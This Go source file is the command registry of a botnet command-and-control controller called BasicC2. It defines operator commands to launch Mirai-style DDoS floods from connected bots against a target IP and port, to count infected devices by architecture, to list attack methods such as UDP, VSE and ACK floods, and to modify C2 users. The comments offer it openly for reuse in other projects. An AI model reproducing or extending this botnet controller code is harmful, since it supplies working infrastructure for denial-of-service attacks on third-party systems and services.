package commands

import (
	"BasicC2/controller/commands/registers"
	"BasicC2/controller/sessions"
)

/*
	I Know You Wanted to Code To be Basic But Give This A Chance!

	This is made to possibly be used in the future for your projects
	An Easy Api Used for your commands
	Easy to edit easy to use
	Expandable !!!!!

*/

// List All Commands
func listcommands(params []string, session *sessions.Term) {

	session.TermCleaner()
	session.TermWrite("\n  Available Commands\r\n")
	session.TermWrite(" ────────────────────\r\n")
	for _, cmd := range commands {

		if cmd.privilege && session.User.Admin != cmd.privilege {
			continue
		}

		session.TermFormat(" Commands: %s Parameters: %d Strict: %t\r\n", cmd.names, cmd.paramLen, cmd.strict)

		if len(cmd.desc) > 0 {
			session.TermWrite(cmd.desc)
		}
	}
}

func register(cmd command) {
	commands = append(commands, cmd)
}

func init() {

	// Use The command structure to add your command
	// look at toRegister And you'll see the function format

	/*
		----- struct
			handle func([]string, *sessions.Term)
			names             []string
			paramLen          int  //
			privilege, strict bool // Priviledge Requres Admin Permissions, Strict only allow a certain amount of params
		---- end
	*/

	/*
		handle: Function name
		Command names []string{"name1","name2","etc.."}
		desc Command Description | can be left blank
		paramLen int type used to set the minimum or required param length
		privilege Set to true if admin is required
		strict Set to true if the paramLen is required
	*/
	register(command{handle: listcommands, names: []string{"list", "commands", "cmds", "?", "help"}, paramLen: 1, strict: true, privilege: true})
	register(command{handle: registers.Cleanscreen, names: []string{"banner", "cls", "clear", "screen"}, desc: "\t- Clears the information on screen and re-prints banner\r\n\n", paramLen: 1, strict: true, privilege: false})
	register(command{handle: registers.MiraiAttack, names: []string{"mirai", "ddos", "second"}, desc: "\t- Sends an attack using available machines\r\n\tEx: tcp 1.1.1.1 duration dport=8080\r\n\n", paramLen: 4, strict: false, privilege: false})
	register(command{handle: registers.BotCount, names: []string{"bots", "botcount", "count", "devices"}, desc: "\t- Shows the types of machines connected\r\n\tEx: bots (all/arch/name)\r\n\n", paramLen: 2, strict: true, privilege: false})
	register(command{handle: registers.MethodScreen, names: []string{"method", "attack", "methods", "attacks"}, desc: "\t- Shows the available methods\r\n\n", paramLen: 1, strict: true, privilege: false})
	register(command{handle: registers.Sql, names: []string{"modifyuser"}, desc: "\t- Modify's a user on the c2\r\n\n", paramLen: 1, strict: false, privilege: false})
	//register(command{handle: registers.MiraiAttack, names: []string{"udp", "rudp", "pudp", "hudp", "udpplain", "tcpbypass", "vse", "std", "ack" }, desc: "\t- Signals All The Devices to Attack A Host\r\n\t-Ex: tcp 1.1.1.1 duration dport=8080\r\n\t-Write ? after duration to view attack flags\r\n", paramLen: 3, strict: false, privilege: false})
}
